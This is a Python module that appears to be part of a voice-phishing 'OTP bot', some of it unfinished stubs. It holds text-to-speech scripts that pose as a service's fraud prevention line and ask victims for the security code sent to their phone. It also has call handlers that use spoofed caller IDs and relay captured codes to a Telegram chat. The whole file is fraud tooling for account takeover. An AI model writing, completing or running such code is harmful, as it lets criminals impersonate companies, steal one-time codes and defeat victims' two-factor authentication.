# BASIC
import asyncio

# OTHER
from server.general import play_audio_direct, send_telegram_message, handle_initiated_call, send_accept_deny, send_end_call, send_call_answered, add_usage, send_detection, send_call_recording, start_recording
from server.general import save_calldetails, fetch_calldetails, delete_calldetails, hangup_call, send_code_vouch



# TTS Payloads
PAYLOAD_START_CALL = "Hello {name}, this is the {service} fraud prevention line. we have sent this automated call because of an attempt to change the password on your {service}F account. if this was not you, please press 1"
PAYLOAD_DTMF_ONE = "To block this request, please enter the {otpdigits} digit security code that we have sent to your mobile device"
PAYLOAD_THANKS = "Thank you for your assistance. Please wait a second while we check the code."

PRESSDTMF_SLEEP_DURATION = 40
HANGUP_SLEEP_DURATION = 120
DELETE_DATA_SLEEP_DURATION = 300

# ADD LATER
async def pgp(data: dict, module: str, event: str, channel_id: str, number: str, spoof: str, service: str, name: str, otpdigits: str, target_number: str, chatid: str, tag: str):
    if event == "call.initiated":
        await handle_initiated_call(channel_id, chatid, number, spoof)

    elif event == "call.answered":
        print("CALL ANSWER DETECTED")
        # START GATHER
        payload = f"Connecting you to target now.."
        await play_audio_direct(channel_id, payload, chatid)

        # ADD LATER
        # new_call = call_info = telnyx.Call.create(
        #     connection_id=connection_id,
        #     to=f"+{targetnumber}",
        #     from_=f"+{spoof}",
        #     from_display_name=f"Support",
        #     webhook_url=f"{url}/pgp/{number}/{spoof}/{targetnumber}/{chatid}/{tag}/{api_key}/{connection_id}/2/{current_call_id}",
        # )

        await send_call_answered(chatid, "🥑 You have answered the call.")



    elif event == "call.gather.ended":
        # Custom End PGP call or something
        pass    
            




async def pgp2(data: dict, event: str, channel_id: str, number: str, spoof: str, service: str, name: str, otpdigits: str, chatid: str, tag: str):


    if event == "call.initiated":
        pass

    elif event == "call.answered":
        print("CALL ANSWER DETECTED")

        # BRIDGE CALL HERE

        

        await send_call_answered(chatid, "🥑 You have answered the call.")

    elif event == "call.speak.ended":
        pass

    elif event == "call.hangup":
        pass

    elif event == "call.recording.saved":
        pass

    elif event == "call.gather.ended":
            webhook=f""

            # Custom End PGP call or something
            #await send_accept_deny(chatid, payload, webhook, otpdigits, f"🪙 OTP Code: {otp_code}", data['data']['payload']['call_control_id'])
            
            
    elif event == "call.machine.detection.ended":
        pass
